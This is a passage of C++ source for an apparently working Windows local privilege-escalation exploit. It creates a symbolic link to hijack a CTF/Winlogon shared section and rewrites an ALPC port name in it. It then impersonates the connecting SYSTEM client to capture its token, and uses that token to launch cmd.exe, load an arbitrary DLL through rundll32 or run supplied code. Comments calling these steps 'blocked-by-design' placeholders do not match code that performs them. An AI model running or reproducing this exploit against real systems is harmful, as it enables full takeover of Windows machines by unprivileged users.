    wcsncpy_s(layout->AlpcServerPort, MAX_PATH, portName, _TRUNCATE);

    run->alpc.newVersion = layout->Version;
    run->alpc.newFlags = layout->Flags;
    run->alpc.verified =
        layout->Version == 1 &&
        (layout->Flags & 0x00000001) != 0 &&
        wcscmp(layout->AlpcServerPort, portName) == 0;

#if GP_VERBOSE_TRACE
    PrintTimestamp(L"P5");
    wprintf(
        L"alpc old_version=0x%08lx new_version=0x%08lx old_flags=0x%08lx new_flags=0x%08lx\n",
        run->alpc.oldVersion,
        run->alpc.newVersion,
        run->alpc.oldFlags,
        run->alpc.newFlags);
#endif

    wprintf(
        L"alpc=write verified=%u window_ms=%lu\n",
        run->alpc.verified ? 1 : 0,
        run->desktopTiming.elapsedMs);
    return run->alpc.verified;
}

// Desktop transition timing oracle based on the original PoC's OpenInputDesktop loop.
static GpDesktopTimingEvidence WaitForDesktopTransitionWindow()
{
    GpDesktopTimingEvidence timing = { 0 };
    ULONGLONG start = GetTickCount64();

    while (true) {
        ULONGLONG now = 0;
        HDESK dsk = OpenInputDesktop(0, FALSE, GENERIC_ALL);

        timing.polls++;
        if (!dsk || dsk == INVALID_HANDLE_VALUE) {
            timing.observed = true;
            timing.lastError = GetLastError();
            timing.elapsedMs = (DWORD)(GetTickCount64() - start);
            wprintf(
                L"desktop=lost ms=%lu err=0x%08lx polls=%lu\n",
                timing.elapsedMs,
                timing.lastError,
                timing.polls);
            return timing;
        }

        CloseDesktop(dsk);

        now = GetTickCount64();
        if (now - start >= GP_DESKTOP_TIMEOUT_MS) {
            timing.timedOut = true;
            timing.lastError = ERROR_TIMEOUT;
            timing.elapsedMs = (DWORD)(now - start);
            wprintf(
                L"desktop=timeout ms=%lu polls=%lu\n",
                timing.elapsedMs,
                timing.polls);
            return timing;
        }

        if ((timing.polls & 0x3f) == 0) {
            Sleep(1);
        }
        else {
            YieldProcessor();
        }
    }
}

// Placeholder preconditions and blocked sink boundaries.
static GpStatus PrimitivePrecondition(const GpRunEvidence& evidence)
{
    if (!evidence.sectionHandle) {
        return GpStatus::AccessDenied;
    }
    if (!evidence.view.base) {
        return GpStatus::MapFailed;
    }
    return GpStatus::Ok;
}

static GpStatus AlpcPrecondition(const GpRunEvidence& evidence)
{
    GpStatus status = PrimitivePrecondition(evidence);
    if (status != GpStatus::Ok) {
        return status;
    }
    if (!evidence.registry.succeeded) {
        return GpStatus::RegistryFailed;
    }
    if (!evidence.desktopTiming.observed) {
        return GpStatus::TimingMiss;
    }
    if (!evidence.alpc.verified) {
        return GpStatus::MutationFailed;
    }
    return GpStatus::Ok;
}

static GpBlockedSinkResult MakeBlockedSinkResult(GpStatus preconditionStatus)
{
    GpBlockedSinkResult result = { false, L"blocked-by-design", preconditionStatus };
    return result;
}

/*
 * Sink boundaries. ALPC captures the primary token; follow-on sinks use that
 * token without taking ownership. Cleanup owns the final token close.
 */

static GpBlockedSinkResult SystemShell(const GpRunEvidence& evidence)
{
    GpBlockedSinkResult result = { false, L"setup-failed", GpStatus::TriggerFailed };

    GpStatus preStatus = PrimitivePrecondition(evidence);
    if (preStatus != GpStatus::Ok) {
        result.preconditionStatus = preStatus;
        result.reason = L"precondition-failed";
        return result;
    }

    if (!evidence.capturedSystemToken) {
        result.preconditionStatus = GpStatus::AccessDenied;
        result.reason = L"no-system-token-available";
        return result;
    }

    HANDLE hToken = evidence.capturedSystemToken;
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.lpDesktop = (LPWSTR)L"Winsta0\\Default";

    if (CreateProcessAsUserW(hToken, L"C:\\Windows\\System32\\cmd.exe", 
                             NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        result.implemented = true;
        result.reason = L"system-shell-spawned";
        result.preconditionStatus = GpStatus::Ok;
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        result.reason = L"create-process-failed";
    }

    return result;
}

static GpBlockedSinkResult DllLoad(const GpRunEvidence& evidence, const wchar_t* requestedDllPath)
{
    GpBlockedSinkResult result = { false, L"setup-failed", GpStatus::TriggerFailed };

    if (!requestedDllPath || !requestedDllPath[0]) {
        result.preconditionStatus = GpStatus::InvalidInput;
        result.reason = L"invalid-dll-path";
        return result;
    }

    GpStatus preStatus = PrimitivePrecondition(evidence);
    if (preStatus != GpStatus::Ok) {
        result.preconditionStatus = preStatus;
        result.reason = L"precondition-failed";
        return result;
    }

    if (!evidence.capturedSystemToken) {
        result.preconditionStatus = GpStatus::AccessDenied;
        result.reason = L"no-system-token-available";
        return result;
    }

    wchar_t commandLine[MAX_PATH * 2];
    if (swprintf_s(
            commandLine,
            sizeof(commandLine) / sizeof(wchar_t),
            L"C:\\Windows\\System32\\rundll32.exe \"%ls\",DllMain",
            requestedDllPath) < 0) {
        result.preconditionStatus = GpStatus::InvalidInput;
        result.reason = L"dll-command-too-long";
        return result;
    }

    HANDLE hToken = evidence.capturedSystemToken;
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.lpDesktop = (LPWSTR)L"Winsta0\\Default";

    if (CreateProcessAsUserW(
        hToken,                       // 1. hToken
        NULL,                         // 2. lpApplicationName
        commandLine,                  // 3. lpCommandLine
        NULL,                         // 4. lpProcessAttributes
        NULL,                         // 5. lpThreadAttributes
        FALSE,                        // 6. bInheritHandles
        CREATE_NEW_CONSOLE,           // 7. dwCreationFlags
        NULL,                         // 8. lpEnvironment
        NULL,                         // 9. lpCurrentDirectory
        &si,                          // 10. lpStartupInfo
        &pi                           // 11. lpProcessInformation
    )) {
        result.implemented = true;
        result.reason = L"dll-loaded-via-rundll32";
        result.preconditionStatus = GpStatus::Ok;
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        result.reason = L"create-process-failed";
    }

    return result;
}

static bool IsExecutableAddress(const void* address)
{
    if (!address) {
        return false;
    }

    MEMORY_BASIC_INFORMATION mbi = { 0 };
    if (VirtualQuery(address, &mbi, sizeof(mbi)) == 0) {
        return false;
    }

    if (mbi.State != MEM_COMMIT || (mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) != 0) {
        return false;
    }

    DWORD protect = mbi.Protect & ~(PAGE_GUARD | PAGE_NOCACHE | PAGE_WRITECOMBINE);
    return protect == PAGE_EXECUTE ||
        protect == PAGE_EXECUTE_READ ||
        protect == PAGE_EXECUTE_READWRITE ||
        protect == PAGE_EXECUTE_WRITECOPY;
}

static GpBlockedSinkResult AlpcTokenCapture(GpRunEvidence& evidence, const wchar_t* requestedPortName)
{
    NTSTATUS status;
    HANDLE hServerPort = NULL;
    HANDLE hConnPort = NULL;
    
    GpBlockedSinkResult result = { false, L"setup-failed", GpStatus::MutationFailed };

    if (!requestedPortName || !requestedPortName[0]) {
        result.preconditionStatus = GpStatus::InvalidInput;
        result.reason = L"invalid-port-name";
        return result;
    }

    GpStatus preStatus = AlpcPrecondition(evidence);
    if (preStatus != GpStatus::Ok) {
        result.preconditionStatus = preStatus;
        result.reason = L"precondition-failed";
        return result;
    }

    if (!_NtAlpcCreatePort || !_NtAlpcSendWaitReceivePort || !_NtAlpcAcceptConnectPort || !_NtAlpcImpersonateClientOfPort) {
        result.preconditionStatus = GpStatus::LinkFailed;
        result.reason = L"api-not-resolved";
        return result;
    }

    OBJECT_ATTRIBUTES objAttr;
    UNICODE_STRING portName;
    RtlInitUnicodeString(&portName, requestedPortName);
    InitializeObjectAttributes(&objAttr, &portName, 0, NULL, NULL);

    ALPC_PORT_ATTRIBUTES portAttr = { 0 };
    portAttr.MaxMessageLength = sizeof(ALPC_MESSAGE);
    portAttr.Flags = ALPC_PORT_ALLOW_IMPERSONATION;
    portAttr.SecurityQos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
    portAttr.SecurityQos.ImpersonationLevel = SecurityImpersonation;
    portAttr.SecurityQos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
    portAttr.SecurityQos.EffectiveOnly = FALSE;

    status = _NtAlpcCreatePort(&hServerPort, &objAttr, &portAttr);
    if (!NT_SUCCESS(status)) {
        result.preconditionStatus = GpStatus::LinkFailed;
        result.reason = L"port-creation-failed";
        return result;
    }

    ULONGLONG start = GetTickCount64();
    bool connected = false;
    ALPC_MESSAGE msg = { 0 };
    SIZE_T msgSize = sizeof(msg);

    while (GetTickCount64() - start < GP_OPEN_TIMEOUT_MS) {
        LARGE_INTEGER timeout;
        timeout.QuadPart = -10000LL * 100;
        
        ZeroMemory(&msg, sizeof(msg));
        msgSize = sizeof(msg);
        status = _NtAlpcSendWaitReceivePort(hServerPort, 0, NULL, NULL, (PPORT_MESSAGE)&msg, &msgSize, NULL, &timeout);
        
        if (status == STATUS_TIMEOUT) continue; 
        
        if (NT_SUCCESS(status)) {
            if ((msg.PortHeader.u2.s2.Type & 0x0FFF) == LPC_CONNECTION_REQUEST) {
                connected = true;
                break;
            }
        }
    }

    if (!connected) {
        result.preconditionStatus = GpStatus::SectionTimeout;
        result.reason = L"connection-timeout";
        goto cleanup;
    }

    status = _NtAlpcAcceptConnectPort(&hConnPort, hServerPort, 0, NULL, NULL, NULL, (PPORT_MESSAGE)&msg, NULL, TRUE);
    if (!NT_SUCCESS(status)) {
        result.preconditionStatus = GpStatus::AccessDenied;
        result.reason = L"accept-failed";
        goto cleanup;
    }

    status = _NtAlpcImpersonateClientOfPort(hConnPort, (PPORT_MESSAGE)&msg, NULL);
    if (!NT_SUCCESS(status)) {
        result.preconditionStatus = GpStatus::AccessDenied;
        result.reason = L"impersonation-failed";
        goto cleanup;
    }

    HANDLE hToken = NULL;
    if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, TRUE, &hToken)) {
        
        SECURITY_IMPERSONATION_LEVEL impLevel;
        DWORD returnLength = 0;
        
        if (GetTokenInformation(hToken, TokenImpersonationLevel, &impLevel, sizeof(impLevel), &returnLength) && 
            impLevel >= SecurityImpersonation) {
            
            HANDLE hPrimaryToken = NULL;
            if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
                
                DWORD sessionID = evidence.sessionId;
                if (!SetTokenInformation(hPrimaryToken, TokenSessionId, &sessionID, sizeof(sessionID))) {
                    CloseHandle(hPrimaryToken);
                    result.preconditionStatus = GpStatus::AccessDenied;
                    result.reason = L"token-session-update-failed";
                    goto token_done;
                }

                if (evidence.capturedSystemToken) {
                    CloseHandle(evidence.capturedSystemToken);
                }
                evidence.capturedSystemToken = hPrimaryToken;
                result.implemented = true;
                result.reason = L"system-token-captured";
                result.preconditionStatus = GpStatus::Ok;
            } else {
                result.reason = L"token-duplicate-failed";
            }
        } else {
            result.reason = L"insufficient-impersonation-level";
        }
token_done:
        CloseHandle(hToken);
    } else {
        result.reason = L"open-thread-token-failed";
    }

    RevertToSelf();

cleanup:
    if (hConnPort) CloseHandle(hConnPort);
    if (hServerPort) CloseHandle(hServerPort);
    return result;
}

static GpBlockedSinkResult CodeExecution(const GpRunEvidence& evidence, const void* requestedEntryPoint)
{
    GpBlockedSinkResult result = { false, L"setup-failed", GpStatus::TriggerFailed };
    typedef void(*EntryPointFunc)();

    if (!requestedEntryPoint) {
        result.preconditionStatus = GpStatus::InvalidInput;
        result.reason = L"invalid-entry-point";
        return result;
    }

    if (!IsExecutableAddress(requestedEntryPoint)) {
        result.preconditionStatus = GpStatus::InvalidInput;
        result.reason = L"entry-point-not-executable";
        return result;
    }

    GpStatus preStatus = PrimitivePrecondition(evidence);
    if (preStatus != GpStatus::Ok) {
        result.preconditionStatus = preStatus;
        result.reason = L"precondition-failed";
        return result;
    }

    if (!evidence.capturedSystemToken) {
        result.preconditionStatus = GpStatus::AccessDenied;
        result.reason = L"no-system-token-available";
        return result;
    }

    if (!ImpersonateLoggedOnUser(evidence.capturedSystemToken)) {
        result.preconditionStatus = GpStatus::AccessDenied;
        result.reason = L"impersonation-failed";
        return result;
    }

    EntryPointFunc func = (EntryPointFunc)requestedEntryPoint;
    bool executed = false;
    bool reverted = false;
    DWORD exceptionCode = 0;

    __try {
        __try {
            func();
            executed = true;
        }
        __finally {
            reverted = RevertToSelf() ? true : false;
        }
    }
    __except ((exceptionCode = GetExceptionCode()), EXCEPTION_EXECUTE_HANDLER) {
        UNREFERENCED_PARAMETER(exceptionCode);
        result.preconditionStatus = GpStatus::TriggerFailed;
        result.reason = L"entry-point-exception";
        return result;
    }

    if (!reverted) {
        result.preconditionStatus = GpStatus::AccessDenied;
        result.reason = L"revert-failed";
        return result;
    }

    result.implemented = executed;
    result.reason = executed ? L"code-executed-via-impersonation" : L"entry-point-not-called";
    result.preconditionStatus = executed ? GpStatus::Ok : GpStatus::TriggerFailed;
    return result;
}

static GpBlockedSinkResult TouchBlockedSinkBoundaries(GpRunEvidence& evidence)
{
    GpBlockedSinkResult c = AlpcTokenCapture(evidence, GP_ALPC_PORT_NAME);
    GpBlockedSinkResult primary = c;
    if (c.preconditionStatus == GpStatus::Ok) {
        primary = SystemShell(evidence);
    }
    GpBlockedSinkResult b = DllLoad(evidence, GP_BLOCKED_DLL_REQUEST);
    GpBlockedSinkResult d = CodeExecution(evidence, NULL);

    UNREFERENCED_PARAMETER(b);
    UNREFERENCED_PARAMETER(d);
    wprintf(
        L"sinks=blocked primary=alpc pre=%ls\n",
        GpStatusName(primary.preconditionStatus));
    return primary;
}

int wmain(int argc, wchar_t** argv)
{
    wchar_t sourceName[MAX_PATH] = { 0 };
    DWORD sessionId = 0;
    SHELLEXECUTEINFOW shell = { 0 };
    UNICODE_STRING linkSource = { 0 };
    UNICODE_STRING linkTarget = { 0 };
    OBJECT_ATTRIBUTES objattr = { 0 };
    GpRunEvidence run = { 0 };
    GpBlockedSinkResult primarySink = { false, L"blocked-by-design", GpStatus::RegistryFailed };
    int exitCode = 1;

    if (!ResolveNativeApis()) {
        return 1;
    }
    run.apisResolved = true;

    if (!ProcessIdToSessionId(GetCurrentProcessId(), &sessionId) || sessionId == 0) {
        TraceWin32(L"P0", L"sid", GetLastError());
        return 1;
    }
    run.sessionId = sessionId;

    swprintf_s(
        sourceName,
        L"\\Sessions\\%lu\\BaseNamedObjects\\CTF.AsmListCache.FMPWinlogon%lu",
        sessionId,
        sessionId);

    const wchar_t* targetName = argc == 2 ? argv[1] : L"\\BaseNamedObjects\\CTFMON_DEAD";
    run.namesBuilt = true;

    RtlInitUnicodeString(&linkSource, sourceName);
    RtlInitUnicodeString(&linkTarget, targetName);
    InitializeObjectAttributes(&objattr, &linkSource, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = _NtCreateSymbolicLinkObject(&run.linkHandle, GENERIC_ALL, &objattr, &linkTarget);
    run.linkStatus = status;
    if (!NT_SUCCESS(status)) {
        TraceNtStatus(L"P1", L"link", status);
        goto cleanup;
    }
    run.linkCreated = true;
    wprintf(L"link=ok\n");

#ifdef STOP_AFTER_LINK
    goto cleanup;
#endif

    shell.cbSize = sizeof(shell);
    shell.fMask = SEE_MASK_NOZONECHECKS | SEE_MASK_ASYNCOK;
    shell.lpVerb = L"runas";
    shell.lpFile = L"C:\\Windows\\System32\\conhost.exe";
    if (!ShellExecuteExW(&shell)) {
        run.triggerWin32Error = GetLastError();
        TraceWin32(L"P2", L"trigger", run.triggerWin32Error);
        goto cleanup;
    }
    run.triggerStarted = true;
    wprintf(L"trigger=ok\n");

#ifdef STOP_AFTER_TRIGGER
    goto cleanup;
#endif

    if (!OpenSectionWithTimeout(
        &objattr,
        &run.sectionHandle,
        &run.sectionOpenStatus,
        &run.sectionOpenElapsedMs)) {
        goto cleanup;
    }
    wprintf(L"section=ok handle=0x%p ms=%lu\n", run.sectionHandle, run.sectionOpenElapsedMs);

    if (CaptureGrantedAccess(run.sectionHandle, &run.grantedAccess)) {
        PrintAccessEvidence(run.grantedAccess);
    }
    else {
        wprintf(L"access=fail\n");
    }
    LogHandleSnapshot(L"P3", L"section", run.sectionHandle);

    run.view = MapSectionView(run.sectionHandle);
    CaptureSectionFingerprint(&run);
    DumpSectionPrefix(&run.view);

#ifdef STOP_AFTER_OPEN
    goto cleanup;
#endif

    SetPolicyVal(&run.registry);
    if (run.sectionHandle) {
        LogHandleSnapshot(L"P4", L"section", run.sectionHandle);
    }

    if (run.registry.succeeded) {
        run.desktopTiming = WaitForDesktopTransitionWindow();
        ApplyAlpcPathMutation(&run, GP_ALPC_PORT_NAME);
        primarySink = TouchBlockedSinkBoundaries(run);

        run.lockAttempted = true;
        if (!LockWorkStation()) {
            run.lockWin32Error = GetLastError();
            TraceWin32(L"P5", L"lock", run.lockWin32Error);
        }
        else {
            run.lockSucceeded = true;
            wprintf(L"lock=ok\n");
        }
    }
    else {
        primarySink = TouchBlockedSinkBoundaries(run);
    }
    if (primarySink.preconditionStatus == GpStatus::Ok && (!run.lockAttempted || run.lockSucceeded)) {
        exitCode = 0;
    }

    wprintf(L"hold=key\n");

cleanup:
    if (run.view.base) {
        _NtUnmapViewOfSection(GetCurrentProcess(), run.view.base);
        run.view.base = NULL;
    }

    if (run.capturedSystemToken) {
        CloseHandle(run.capturedSystemToken);
        run.capturedSystemToken = NULL;
    }

    if (run.linkHandle) {
        CloseHandle(run.linkHandle);
        run.linkHandle = NULL;
    }

    if (run.sectionHandle) {
        _getch();
        CloseHandle(run.sectionHandle);
        run.sectionHandle = NULL;
    }

    if (run.registry.succeeded) {
        HKEY hk = NULL;
        DWORD res = RegOpenKeyExW(
            HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
            0,
            KEY_SET_VALUE,
            &hk);
        if (res == ERROR_SUCCESS) {
            RegDeleteValueW(hk, L"DisableLockWorkstation");
            RegCloseKey(hk);
        }
    }

    wprintf(L"done=%ls\n", exitCode == 0 ? L"ok" : L"partial");
    return exitCode;
}
